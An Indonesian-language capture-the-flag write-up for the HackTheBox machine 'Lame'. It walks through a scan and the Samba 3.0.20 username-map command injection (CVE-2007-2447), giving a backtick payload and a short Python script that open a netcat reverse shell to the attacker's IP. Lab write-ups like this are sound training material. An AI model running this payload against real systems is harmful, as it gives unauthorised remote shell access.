---
title: "Writeup: Capture The Flag - HackTheBox 'Lame'"
date: "2026-02-13"
category: "Writeup"
tags: "HTB, CTF, Easy, Linux, Samba"
author: "Paperalt"
description: "Writeup singkat untuk mesin Lame di HackTheBox. Mesin legendaris yang mengajarkan kita tentang Samba Vulnerability (CVE-2007-2447)."
---

## Reconnaissance

Langkah pertama seperti biasa adalah scanning network menggunakan Nmap.

```bash
nmap -sC -sV -oA nmap/lame 10.10.10.3
```

Output menunjukkan port yang terbuka:
*   **21/tcp (FTP)**: vsftpd 2.3.4
*   **139/tcp, 445/tcp (SMB)**: Samba 3.0.20-Debian

## Vulnerability Analysis

Versi Samba `3.0.20` sangat tua dan terkenal rentan terhadap **Username Map Script Command Execution** (CVE-2007-2447).

Kita bisa mencari exploitnya di Metasploit atau searchsploit.

```bash
searchsploit samba 3.0.20
```

## Exploitation

Kita akan gunakan exploit manual menggunakan python agar lebih paham cara kerjanya, daripada sekadar klik Metasploit.

Vulnerability ini terjadi karena input sanitization yang buruk pada username saat login menggunakan protokol SMB. Kita bisa menyisipkan payload shellcode di sana.

Payload:
```bash
"/=`nohup nc -e /bin/sh 10.10.14.5 4444`"
```

### Script Exploit

Berikut adalah potongan script exploit yang saya modifikasi:

```python
from smb.SMBConnection import SMBConnection

def exploit(target_ip, shell_payload):
    conn = SMBConnection(shell_payload, "", "", "")
    try:
        conn.connect(target_ip, 139)
    except:
        print("[+] Payload sent! Check your listener.")

exploit("10.10.10.3", "/=`nohup nc -e /bin/sh 10.10.14.5 4444`")
```

Setelah menjalankan script tersebut, kita mendapatkan reverse shell di listener netcat kita!

## Root Flag

User langsung root, jadi tidak perlu privilege escalation.

```bash
cd /root
cat root.txt
# c4ca4238a0b923820dcc509a6f75849b
```

## Lessons Learned

1.  Selalu update service yang terekspos ke internet.
2.  Jangan biarkan konfigurasi default yang tidak aman.
3.  SMB adalah protokol yang "berisik" dan sering jadi jalan masuk hacker.
